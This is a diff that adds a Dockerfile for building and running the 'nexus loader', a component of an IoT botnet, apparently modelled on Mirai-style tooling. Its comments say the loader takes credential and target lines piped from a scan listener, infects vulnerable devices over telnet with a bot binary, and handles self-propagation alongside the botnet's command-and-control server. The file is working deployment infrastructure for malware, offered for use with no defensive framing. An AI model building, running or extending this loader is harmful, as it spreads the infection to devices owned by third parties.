@@ -1,0 +1,37 @@
+# ================================================================
+#  nexus loader — Docker build for the telnet payload delivery server.
+#
+#  The loader reads "ip:port user:pass arch" lines from stdin
+#  and infects vulnerable IoT devices with the bot binary.
+#
+#  Build:  docker build -f Dockerfile.loader -t nexus-loader .
+#
+#  This is OPTIONAL — the core botnet (CNC + bot) works without it.
+#  You only need the loader if you're doing self-propagation.
+# ================================================================
+
+FROM golang:1.21-alpine AS builder
+
+WORKDIR /build
+COPY loader/go.mod loader/go.sum* ./
+RUN go mod download 2>/dev/null || true
+COPY loader/ ./
+
+RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
+    go build -ldflags="-s -w" -o nexus-loader .
+
+FROM alpine:3.20
+
+RUN apk add --no-cache ca-certificates && \
+    adduser -D -H -s /sbin/nologin nexus
+
+USER nexus
+WORKDIR /data
+
+# The loader needs the dlr binaries for echo delivery.
+# Mount them at runtime: -v ./dlr/release:/dlr:ro
+COPY --from=builder /build/nexus-loader /nexus-loader
+
+# Loader reads targets from stdin (piped from scan listener).
+ENTRYPOINT ["/nexus-loader", "-threads", "8"]
+CMD ["-wget-ip", "127.0.0.1"]
